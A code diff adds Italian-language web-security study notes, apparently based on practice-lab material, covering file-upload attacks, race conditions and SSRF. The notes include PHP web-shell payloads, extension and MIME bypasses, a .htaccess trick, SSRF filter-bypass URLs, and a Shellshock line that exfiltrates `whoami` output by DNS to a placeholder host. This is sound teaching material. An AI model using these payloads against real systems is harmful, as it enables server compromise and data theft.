@@ -659,6 +659,235 @@ ACCESS_CONTROL = macro(
 )
 
 
+# ===========================================================================
+#  8. FILE UPLOAD
+# ===========================================================================
+FILE_UPLOAD = macro(
+    "File Upload",
+    "Caricare file pericolosi (fino alla web shell/RCE) per validazione insufficiente.",
+    (
+        "Nascono quando il server accetta upload senza validare bene nome, tipo, contenuto o "
+        "dimensione. Nel caso peggiore si carica uno script lato server (es. .php) che il server "
+        "esegue: web shell e RCE. Altri impatti: sovrascrittura di file, DoS per dimensione.\n\n"
+        "Prevenzione: whitelist di estensioni; nome senza ../; rinominare i file; non salvarli "
+        "nel filesystem finche' non validati; usare framework consolidati."
+    ),
+    references=PS + "/file-upload",
+    children=[
+        micro("Upload senza restrizioni (web shell)",
+              "Quando il server esegue lo script caricato.", [
+            test("Caricare una web shell PHP",
+                 goal="Eseguire comandi o leggere file tramite il file caricato.",
+                 payload="<?php echo file_get_contents('/home/carlos/secret'); ?>",
+                 process="Carica lo script, poi richiedilo (es. GET /files/avatars/exploit.php): l'output dello script torna nella risposta."),
+            lab("Lab: web shell via avatar",
+                process="Lab risolto caricando exploit.php (con file_get_contents del segreto di Carlos) dalla funzione avatar, poi aprendo GET /files/avatars/exploit.php in Repeater e leggendo l'output."),
+        ]),
+        micro("Validazione del tipo di file",
+              "Content-Type falsificabile e directory di esecuzione.", [
+            test("Falsificare il Content-Type",
+                 goal="Superare un controllo che si fida del MIME dichiarato.",
+                 payload="Content-Disposition: form-data; name=\"avatar\"; filename=\"shell.php\"\nContent-Type: image/jpeg\n\n<?php echo file_get_contents('/home/carlos/secret'); ?>",
+                 process="In multipart/form-data cambia il Content-Type della parte file in image/jpeg pur caricando un .php: se non si verifica il contenuto reale, passa."),
+            lab("Lab: Content-Type falso",
+                process="Lab risolto cambiando la richiesta di cambio immagine: filename=\"shell.php\", Content-Type: image/jpeg e payload PHP; poi tornando alla home che esegue lo script."),
+            test("Eseguire in un'altra directory (traversal nel filename)",
+                 goal="Mettere lo script in una directory dove l'esecuzione e' consentita.",
+                 payload="filename=\"..%2fexploit.php\"",
+                 process="Il campo filename decide dove salvare: con ../ (anche URL-encoded) esci dalla cartella upload verso una directory eseguibile; poi richiedi il file."),
+            lab("Lab: traversal nel filename",
+                process="Lab risolto modificando filename in ..%2fexploit.php (Content-Type: text/php, payload PHP) e poi aprendo GET /files/exploit.php."),
+        ]),
+        micro("Blacklist e offuscamento delle estensioni",
+              "Aggirare i filtri sulle estensioni.", [
+            test("Estensioni alternative e offuscamento",
+                 goal="Trovare un'estensione eseguibile che superi la blacklist.",
+                 payload=".php5   .shtml   .phtml   .pHp   exploit.php.jpg   exploit.php.   exploit%2Ephp   exploit.asp;.jpg   exploit.asp%00.jpg   exploit.p.phphp",
+                 process="Prova estensioni meno comuni, doppie estensioni, caratteri finali, URL/double encoding, null byte/;, Unicode multibyte, e stringhe che dopo lo stripping non ricorsivo restano valide (es. .p.phphp -> .php)."),
+            test("Sovrascrivere la config del server (.htaccess / web.config)",
+                 goal="Far eseguire un'estensione arbitraria caricando un file di config.",
+                 payload="filename=\".htaccess\"   ->   AddType application/x-httpd-php .l33t",
+                 process="Se puoi caricare .htaccess (Apache) o web.config (IIS), mappa un'estensione custom a un MIME eseguibile, poi carica lo script con quell'estensione."),
+            lab("Lab: .htaccess + estensione custom",
+                process="Lab risolto caricando un .htaccess (Content-Type text/plain) con 'AddType application/x-httpd-php .l33t', poi caricando exploit.l33t col payload PHP: viene eseguito come .php."),
+            lab("Lab: null byte nell'estensione",
+                process="Lab risolto caricando filename=exploit.php%00.jpg (Content-Type text/php, payload PHP) e aprendo GET /files/exploit.php."),
+        ]),
+        micro("Validazione del contenuto (magic bytes)",
+              "Quando il server verifica le proprieta' reali del file.", [
+            test("JPEG poliglotta con ExifTool",
+                 goal="Superare il controllo della firma del file (un JPEG inizia con FF D8 FF).",
+                 payload="exiftool -Comment=\"<?php echo file_get_contents('/home/carlos/secret'); ?>\" img.jpg",
+                 process="Crea un file che e' un'immagine valida ma contiene il payload nei metadati (campo Comment); caricalo e cerca la stringa nella risposta."),
+            lab("Lab: poliglotta JPEG",
+                process="Lab risolto creando con exiftool un file poliglotta col payload nel metadato Comment, caricandolo come immagine profilo e cercando la stringa segreta nella risposta."),
+        ]),
+        micro("Altri vettori",
+              "Senza RCE: client-side, parsing, PUT, race condition.", [
+            test("Script lato client (SVG/HTML -> stored XSS)",
+                 goal="Se non c'e' esecuzione server, sfruttare il client.",
+                 payload="<svg><script>alert(document.domain)</script></svg>",
+                 process="Carica HTML o SVG con <script>: se servito dallo stesso dominio e visto da altri, e' stored XSS (vincolo Same-Origin Policy)."),
+            test("Parsing del file (XXE)",
+                 goal="Sfruttare il parser del formato.",
+                 process="Se il server analizza file basati su XML (es. .docx/.xlsx), puo' essere vettore di XXE (vedi la macro XXE)."),
+            test("Metodo HTTP PUT",
+                 goal="Caricare file senza una funzione di upload.",
+                 payload="PUT /images/exploit.php HTTP/1.1\nContent-Type: application/x-httpd-php\n\n<?php echo file_get_contents('/path/to/file'); ?>",
+                 process="Con OPTIONS verifica se un endpoint dichiara PUT; se abilitato e non protetto, carica il file direttamente."),
+            test("Race condition nell'upload",
+                 goal="Eseguire il file nel breve istante prima che venga validato/eliminato.",
+                 process="Se il file viene salvato e poi eliminato se non valido (es. scansione AV), richiedilo nella race window. Negli upload via URL con directory a nome casuale (uniqid di PHP) prova a prevederlo/brute-forzarlo allungando l'elaborazione."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  9. RACE CONDITIONS
+# ===========================================================================
+RACE_CONDITIONS = macro(
+    "Race Conditions",
+    "Richieste concorrenti non protette che collidono sugli stessi dati.",
+    (
+        "Le race condition nascono quando il sito elabora richieste concorrenti senza "
+        "protezioni: piu' thread toccano gli stessi dati nella 'race window' (la frazione di "
+        "secondo tra due interazioni, es. col database), con comportamenti indesiderati.\n\n"
+        "Per minimizzare il jitter di rete: su HTTP/2 il single-packet attack (20-30 richieste "
+        "in un solo pacchetto TCP), su HTTP/1 la last-byte synchronization. In Burp: gruppo di "
+        "schede + Send group in parallel, oppure l'azione Trigger race conditions."
+    ),
+    references=PS + "/race-conditions",
+    children=[
+        micro("Limit overrun", "Superare un limite inviando richieste in parallelo.", [
+            test("Con Burp Repeater",
+                 goal="Superare un limite monouso o rate-limited (coupon, inviti...).",
+                 process="Raggruppa piu' copie della richiesta e inviale in parallelo (Send group in parallel, o Custom action 'Trigger race conditions') per superare il limite."),
+            lab("Lab: riuso del coupon",
+                process="Lab risolto mandando la POST di applicazione del coupon a Repeater e usando Custom actions -> from template -> Trigger race condition per inviarla 20 volte insieme e ottenere piu' sconti."),
+            test("Con Turbo Intruder (single-packet)",
+                 goal="Single-packet attack su molti valori.",
+                 payload="engine=Engine.BURP2\nconcurrentConnections=1\nengine.queue(req, gate='1'); engine.openGate('1')",
+                 process="Su target HTTP/2, con Turbo Intruder accoda le richieste su un gate e aprilo per inviarle simultaneamente."),
+            lab("Lab: brute-force password in parallelo",
+                process="Lab risolto mandando la POST a Turbo Intruder, copiando il codice fornito e testando contemporaneamente tutte le password dell'utente carlos."),
+        ]),
+        micro("Metodologia (sotto-stati nascosti)",
+              "Trovare collisioni oltre il semplice limit overrun.", [
+            test("Prevedi, cerca indizi, dimostra",
+                 goal="Individuare endpoint con potenziale di collisione.",
+                 process="1) Dopo aver mappato il sito, scegli endpoint security-critical con potenziale di collisione. 2) Baseline con 'Send group in sequence', poi invia lo stesso gruppo in parallelo (single-packet/last-byte) e cerca differenze. 3) Riduci al minimo le richieste mantenendo l'effetto."),
+        ]),
+        micro("Race condition multi-endpoint",
+              "Richieste simultanee verso endpoint diversi.", [
+            test("Allineare le race window",
+                 goal="Colpire piu' endpoint nello stesso istante.",
+                 process="Ostacoli: ritardi di rete (nuova connessione back-end) e di elaborazione per-endpoint. Il 'connection warming' (una GET alla home all'inizio del gruppo) distingue i ritardi uniformi. Se non basta: ritardo lato client (Turbo Intruder) o satura il rate-limit con richieste fittizie per ritardare il server."),
+            lab("Lab: checkout prima dell'aggiunta",
+                process="Lab risolto: intercetti POST /cart (impostato productId=1, la giacca) e POST /cart/checkout, le metti nello stesso gruppo Repeater e usi Send parallel: col timing giusto il checkout valida il credito prima che la giacca sia nel carrello e l'ordine si completa comunque."),
+        ]),
+        micro("Race condition su singolo endpoint",
+              "Richieste parallele con valori diversi allo stesso endpoint.", [
+            test("Collisione sullo stato di sessione",
+                 goal="Far collidere due operazioni sulla stessa sessione.",
+                 process="Es. reset password che salva userID e token in sessione: due reset paralleli dalla stessa sessione con username diversi possono lasciare in sessione l'ID della vittima ma mandare il token valido all'attaccante. Se le richieste sono seriali (PHP blocca per sessione), usa un token di sessione diverso per ciascuna."),
+            lab("Lab: cambio email in collisione",
+                process="Lab risolto mandando due POST changeemail insieme (gruppo Repeater), una con valore valido e una con la mail di carlos: dopo alcuni tentativi arriva la mail di cambio con l'indirizzo di carlos."),
+        ]),
+        micro("Costruzione parziale e attacchi temporali",
+              "Stati intermedi e token basati sul tempo.", [
+            test("Costruzione parziale degli oggetti",
+                 goal="Sfruttare uno stato intermedio dell'oggetto.",
+                 process="Se un oggetto e' creato in piu' passaggi (es. utente creato, poi API key impostata con una seconda query), esiste una finestra in cui l'utente esiste senza API key."),
+            test("Attacchi sensibili al fattore tempo",
+                 goal="Collidere token generati da timestamp.",
+                 process="Se un token (es. reset password) e' randomizzato solo da un timestamp, sincronizza due richieste per due utenti diversi perche' generino lo stesso timestamp -> stesso token."),
+            lab("Lab: token identici da timestamp",
+                process="Lab risolto prendendo due richieste di password reset (in una cambio user, cookie di sessione e CSRF token da un'altra GET, perche' PHP non permette due richieste parallele sulla stessa sessione) e mandandole in parallelo: si creano due token di reset identici per wiener e carlos, dato che dipendono solo dal timestamp."),
+        ]),
+    ],
+)
+
+
+# ===========================================================================
+#  10. SSRF
+# ===========================================================================
+SSRF = macro(
+    "SSRF",
+    "Indurre il server a fare richieste verso destinazioni non previste.",
+    (
+        "La Server-Side Request Forgery (SSRF) induce l'applicazione lato server a effettuare "
+        "richieste verso una destinazione non prevista: servizi interni (loopback 127.0.0.1/"
+        "localhost, IP privati) o sistemi esterni arbitrari. Spesso i controlli di accesso "
+        "vengono aggirati perche' la richiesta 'sembra' provenire da una posizione affidabile.\n\n"
+        "Prevenzione tipica: whitelist rigide, nessun follow dei redirect, validazione robusta "
+        "dell'URL dopo la risoluzione."
+    ),
+    references=PS + "/ssrf",
+    children=[
+        micro("SSRF contro il server", "Puntare al server stesso via loopback.", [
+            test("Puntare a localhost",
+                 goal="Raggiungere funzioni interne considerate affidabili.",
+                 payload="stockApi=http://localhost/admin",
+                 process="Sostituisci l'URL che il server recupera con uno locale: /admin da localhost aggira i controlli d'accesso (richiesta 'dalla macchina locale')."),
+            lab("Lab: SSRF a localhost/admin",
+                process="Lab risolto: in Check stock cambi stockApi in http://localhost/admin, leggi l'HTML per l'URL di delete e usi stockApi=http://localhost/admin/delete?username=carlos."),
+        ]),
+        micro("SSRF contro back-end interni", "Raggiungere IP privati non esposti.", [
+            test("Puntare a un IP interno",
+                 goal="Accedere a interfacce su rete privata.",
+                 payload="stockApi=http://192.168.0.68/admin",
+                 process="Punta a IP privati; se non conosci l'host, spazza l'ultimo ottetto con Intruder (Numbers 1-255) e cerca lo stato 200."),
+            lab("Lab: sweep dell'IP interno",
+                process="Lab risolto con Intruder su http://192.168.0.1:8080/admin (ultimo ottetto 1-255), trovata la voce con stato 200, poi stockApi=.../admin/delete?username=carlos."),
+        ]),
+        micro("Aggirare difese basate su blacklist",
+              "Quando bloccano 127.0.0.1/localhost o /admin.", [
+            test("Rappresentazioni alternative e offuscamento",
+                 goal="Eludere il filtro su hostname/percorso.",
+                 payload="http://2130706433/   http://017700000001/   http://127.1/\nspoofed.burpcollaborator.net\nURL encoding / doppio encoding / maiuscole-minuscole\nredirect da un URL sotto controllo",
+                 process="Usa forme alternative di 127.0.0.1, un dominio che risolve a 127.0.0.1, offusca le stringhe bloccate, o un redirect (anche cambiando http->https)."),
+            lab("Lab: bypass blacklist",
+                process="Lab risolto: http://127.1/ aggira il blocco di http://127.0.0.1/; poi per /admin offuschi la 'a' con doppio URL encoding (%2561) -> /%2561dmin per accedere ed eliminare l'utente."),
+        ]),
+        micro("Aggirare difese basate su whitelist",
+              "Sfruttare incongruenze nel parsing degli URL.", [
+            test("Trucchi di parsing dell'URL",
+                 goal="Far accettare un host non consentito.",
+                 payload="https://expected-host@evil-host\nhttps://evil-host#expected-host\nhttps://expected-host.evil-host\nURL encoding / doppio encoding",
+                 process="Usa @ (credenziali embedded), # (frammento), la gerarchia DNS, o l'URL encoding per far divergere cio' che il filtro vede da cio' che viene richiesto."),
+            lab("Lab: bypass whitelist con # e double encoding",
+                process="Lab risolto: http://username@stock.weliketoshop.net/ e' accettato (credenziali embedded); il # viene rifiutato ma con doppio encoding (%2523) passa: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos."),
+        ]),
+        micro("Open Redirection per SSRF",
+              "Superare il filtro con un redirect verso l'interno.", [
+            test("Sfruttare una open redirection",
+                 goal="Far seguire al server un redirect verso il bersaglio interno.",
+                 payload="stockApi=http://host-consentito/product/nextProduct?path=http://192.168.0.68/admin",
+                 process="Se l'URL passa la whitelist ma contiene una open redirection, il server segue il redirect verso l'host interno scelto."),
+            lab("Lab: SSRF via open redirect",
+                process="Lab risolto: il parametro path finisce nell'header Location (open redirect); stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin (poi .../admin/delete?username=carlos) fa seguire il redirect all'interno."),
+        ]),
+        micro("Blind SSRF", "Quando la risposta del back-end non torna al client.", [
+            test("Individuare con OAST (Collaborator)",
+                 goal="Confermare la SSRF senza vederne la risposta.",
+                 process="Inserisci un dominio Burp Collaborator univoco in un parametro URL (o nell'header Referer, spesso visitato dagli analytics) e monitora le interazioni. Nota: spesso vedi solo DNS (HTTP in uscita bloccato)."),
+            lab("Lab: Blind SSRF via Referer",
+                process="Lab risolto inserendo un payload Collaborator nell'header Referer in Repeater e osservando le interazioni DNS/HTTP in Poll now."),
+            test("Sfruttare la Blind SSRF (scan interno)",
+                 goal="Usare la blind SSRF per colpire altri sistemi interni.",
+                 payload="() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN",
+                 process="Scansiona lo spazio IP interno con payload noti (es. Shellshock nell'User-Agent via Referer): l'esfiltrazione DNS porta fuori l'output (es. whoami)."),
+            lab("Lab: Blind SSRF + Shellshock",
+                process="Lab risolto con Collaborator Everywhere: payload Shellshock nell'User-Agent, Referer su http://192.168.0.1:8080 e sweep dell'ultimo ottetto (1-255) con Intruder; l'interazione DNS riporta il nome utente del sistema interno."),
+            test("Superfici: URL parziali e formati dati",
+                 goal="Riconoscere altri punti di SSRF.",
+                 process="A volte controlli solo l'hostname o parte del path (SSRF limitata). Formati come XML possono richiedere URL automaticamente (SSRF via XXE)."),
+        ]),
+    ],
+)
+
+
 # Tutte le macrocategorie, nell'ordine degli appunti.
 MACROS = [
     SQL_INJECTION,
@@ -668,6 +897,9 @@ MACROS = [
     BUSINESS_LOGIC,
     INFORMATION_DISCLOSURE,
     ACCESS_CONTROL,
+    FILE_UPLOAD,
+    RACE_CONDITIONS,
+    SSRF,
 ]
 
 
